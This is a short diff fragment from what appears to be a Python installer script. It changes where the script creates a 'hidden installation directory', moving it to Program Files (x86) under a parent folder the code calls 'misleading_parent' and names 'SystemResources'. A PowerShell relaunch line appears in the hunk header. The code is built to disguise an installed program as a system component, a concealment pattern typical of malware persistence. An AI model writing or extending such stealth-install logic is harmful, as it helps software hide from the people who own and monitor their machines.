@@ -1309,9 +1309,10 @@ powershell -Command "Start-Process -FilePath '{sys.executable}' -ArgumentList '{
         print("Creating hidden installation directory...")
         
         try:
-            # Generate random GUID-based path in ProgramData
+            # Generate random GUID-based path in Program Files (x86) for better 64-bit compatibility
             if self.system == "Windows":
-                base_path = Path(os.environ.get('PROGRAMDATA', 'C:\\ProgramData'))
+                # Use Program Files (x86) for better compatibility with 64-bit systems
+                base_path = Path(os.environ.get('PROGRAMFILES(X86)', 'C:\\Program Files (x86)'))
                 misleading_parent = base_path / "SystemResources"
                 misleading_parent.mkdir(exist_ok=True)
                 
